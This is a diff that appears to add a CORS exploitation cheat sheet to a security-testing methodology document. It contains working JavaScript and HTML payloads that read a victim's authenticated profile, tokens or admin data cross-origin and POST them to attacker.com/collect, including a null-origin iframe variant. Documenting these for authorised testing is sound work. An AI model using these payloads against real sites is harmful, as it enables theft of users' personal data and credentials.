@@ -339,3 +339,59 @@ Send crafted `Origin` headers and inspect the response ACAO. If ACAO reflects yo
 ## Verification & Impact
 
 CONFIRMED when ACAO reflects an attacker-controlled origin (or null/subdomain) AND `ACAC: true` is present, demonstrated by a cross-origin `fetch` with `credentials: 'include'` that can read the response (profile, tokens, admin data). SUSPECTED when a misconfiguration exists but credential readability isn't proven — record as candidate. Document impact by data accessible cross-origin (PII, tokens, authenticated API data) and severity (typically High when credentials + sensitive data). Capture the probe request/response headers and the exfiltration proof via `recordEvidence`.
+
+---
+
+## Cheat Sheet — CORS Exploitation
+
+### Origin Reflection Test
+
+```javascript
+// From attacker page
+fetch('https://target.com/api/user/profile', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => {
+    // Send to attacker server
+    fetch('https://attacker.com/collect', {method: 'POST', body: JSON.stringify(data)});
+  });
+```
+
+### Null Origin Bypass
+
+```html
+<!-- data: URI triggers null origin -->
+<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://target.com/api/user',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('https://attacker.com/collect',{method:'POST',body:d}))</script>">
+```
+
+### Subdomain Exploitation
+
+```javascript
+// If *.target.com is trusted
+// Compromise any subdomain (XSS, SSRF, etc.)
+// Use compromised subdomain as origin
+fetch('https://target.com/api/admin', {
+  credentials: 'include',
+  headers: {'Origin': 'https://subdomain.target.com'}
+});
+```
+
+### Preflight Replay
+
+```javascript
+// If preflight accepts attacker origin
+// But actual response doesn't check
+// Send OPTIONS request first, then GET with credentials
+```
+
+### Data Extraction Patterns
+
+```javascript
+// Profile data
+GET /api/user/profile → {"name": "admin", "email": "admin@target.com", "role": "admin"}
+
+// Tokens
+GET /api/auth/token → {"access_token": "...", "refresh_token": "..."}
+
+// Sensitive endpoints
+GET /api/admin/users → [{"id":1, "email":"..."}, ...]
+```
